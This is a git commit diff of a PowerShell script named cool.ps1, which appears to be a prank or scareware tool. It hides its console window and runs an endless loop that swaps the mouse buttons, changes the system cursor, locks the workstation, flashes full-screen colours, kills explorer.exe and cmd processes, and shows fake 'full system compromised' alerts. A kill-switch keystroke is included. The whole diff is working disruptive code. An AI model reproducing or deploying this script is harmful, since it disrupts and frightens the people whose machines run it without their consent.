3ff98673f4c1d86620308f4dce8d60f427b861e2
Harish Ashok <68806913+Boldmoon@users.noreply.github.com>
2024-11-15 22:36:03 +0530

    Update cool.ps1

--- cool.ps1
+++ cool.ps1
@@ -9,69 +9,141 @@ public class HiddenWindow {
     public static extern IntPtr GetConsoleWindow();
     public static void Hide() {
         IntPtr hWnd = GetConsoleWindow();
-        ShowWindow(hWnd, 0); // 0 = SW_HIDE
+        ShowWindow(hWnd, 0);
     }
 }
 "@
 [HiddenWindow]::Hide()
 
-function Show-ScaryMessage {
-    $messages = @(
-        "ALERT! SYSTEM COMPROMISED!",
-        "Your files are now under our control.",
-        "SELF-DESTRUCT INITIATED! Get out now.",
-        "Warning! Your system is about to crash!",
-        "Please standby, we are erasing your system!!",
-        "You are being monitored. No escape.",
-        "Emergency! This message will self-destruct.",
-        "We are in your network. Prepare for consequences."
+function Random-ScreenEffects {
+    $effects = @(
+        { 
+            Add-Type -TypeDefinition @"
+            using System;
+            using System.Runtime.InteropServices;
+            public class SystemSounds {
+                [DllImport("user32.dll")]
+                public static extern int MessageBeep(uint uType);
+            }
+            "@
+            [SystemSounds]::MessageBeep(0)
+        },
+        { 
+            $cmd = "rundll32 user32.dll,SwapMouseButton"
+            Invoke-Expression $cmd
+        },
+        { 
+            Add-Type -TypeDefinition @"
+            using System;
+            using System.Runtime.InteropServices;
+            public class CursorChanger {
+                [DllImport("user32.dll")]
+                public static extern bool SetSystemCursor(IntPtr hCursor, uint nIndex);
+            }
+            "@
+            $cursor = [System.IntPtr]::Zero
+            [CursorChanger]::SetSystemCursor($cursor, 0x0001)
+        },
+        {
+            Add-Type -TypeDefinition @"
+            using System;
+            using System.Runtime.InteropServices;
+            public class ScreenBlaster {
+                [DllImport("user32.dll")]
+                public static extern bool LockWorkStation();
+            }
+            "@
+            [ScreenBlaster]::LockWorkStation()
+        }
     )
-    $randomMessage = $messages | Get-Random
-    [System.Windows.Forms.MessageBox]::Show($randomMessage, "Critical System Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop)
+    $randomEffect = $effects | Get-Random
+    $randomEffect.Invoke()
 }
 
-function Open-RandomWebsite {
-    $websites = @(
-        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",  
-        "https://tenor.com/view/monkey-news-stare-gif-26455378",
-        "https://www.youtube.com/watch?v=YbJOTdZBX1g",
-        "https://www.youtube.com/watch?v=HzL8lh39Y2Q",
-        "https://www.youtube.com/watch?v=RoKDsK8_ToQ",
-        "https://www.youtube.com/watch?v=gsLvizl5j4E"
+function FlashScreen {
+    $flashColors = @("Red", "Blue", "Green", "Yellow", "Pink")
+    $randomColor = $flashColors | Get-Random
+    $flashScript = @"
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Drawing;
+    using System.Windows.Forms;
+    public class FlashWindow {
+        public static void Flash() {
+            Form flashForm = new Form();
+            flashForm.WindowState = FormWindowState.Maximized;
+            flashForm.BackColor = Color.$randomColor;
+            flashForm.TopMost = true;
+            flashForm.Show();
+            flashForm.Visible = true;
+            System.Threading.Thread.Sleep(500);
+            flashForm.Visible = false;
+        }
+    }
+    "@
+    [FlashWindow]::Flash()
+"@
+    Invoke-Expression $flashScript
+}
+
+function Random-Madness {
+    $madnessActions = @(
+        { FlashScreen; Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5) },
+        { Random-ScreenEffects; Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3) },
+        { 
+            Start-Process "cmd"
+            Start-Sleep -Seconds 2
+            $cmdProcess = Get-Process cmd
+            $cmdProcess.Kill()
+        },
+        { 
+            [console]::beep(700, 2000)
+            Start-Sleep -Seconds 1
+            [console]::beep(1200, 100)
+        }
     )
-    $randomWebsite = $websites | Get-Random
-    Start-Process $randomWebsite
+    $madAction = $madnessActions | Get-Random
+    $madAction.Invoke()
 }
 
-function Play-Sound {
-    $sounds = @(
-        { [console]::beep(1000, 500) },  
-        { [console]::beep(2000, 800) },  
-        { [console]::beep(500, 300) },   
-        { [console]::beep(1000, 1500) }  
+function Trigger-FinalPhase {
+    $finalPhaseActions = @(
+        { 
+            [System.Windows.Forms.MessageBox]::Show("SYSTEM INFECTION: YOU CANNOT ESCAPE.", "ERROR: FULL SYSTEM COMPROMISED", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Critical)
+            Start-Sleep -Seconds 1
+        },
+        { 
+            Start-Process "explorer.exe"
+            Start-Sleep -Seconds 1
+            $explorerProcess = Get-Process explorer
+            $explorerProcess.Kill()
+        },
+        {
+            [System.Windows.Forms.MessageBox]::Show("This is it. It's over.", "GOODBYE.", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+        }
     )
-    $randomSound = $sounds | Get-Random
-    $randomSound.Invoke()
+    $randomFinalAction = $finalPhaseActions | Get-Random
+    $randomFinalAction.Invoke()
 }
 
-for ($i = 0; $i -lt 10; $i++) {
-    $randomInterval = Get-Random -Minimum 2 -Maximum 3
-    Start-Sleep -Minutes $randomInterval
-
-    Show-ScaryMessage
-    Start-Sleep -Seconds 3
-
-    $randomInterval = Get-Random -Minimum 2 -Maximum 3
-    Start-Sleep -Minutes $randomInterval
-
-    Open-RandomWebsite
-    Start-Sleep -Seconds 3
-
-    $randomInterval = Get-Random -Minimum 2 -Maximum 3
-    Start-Sleep -Minutes $randomInterval
-
-    Play-Sound
-    Start-Sleep -Seconds 3
+function Kill-Switch {
+    $key = [System.Windows.Forms.Keys]::Control | [System.Windows.Forms.Keys]::Shift | [System.Windows.Forms.Keys]::K
+    $keyListener = New-Object System.Windows.Forms.Form
+    $keyListener.KeyPreview = $true
+    $keyListener.Add_KeyDown({
+        if ($_.Control -and $_.Shift -and $_.KeyCode -eq [System.Windows.Forms.Keys]::K) {
+            $keyListener.Close()
+            exit
+        }
+    })
+    $keyListener.ShowDialog()
 }
 
-[System.Windows.Forms.MessageBox]::Show("Location reported to CIA.", "FINAL WARNING", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+Start-Job { Kill-Switch }
+
+while ($true) {
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    Random-Madness
+    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
+    Trigger-FinalPhase
+}
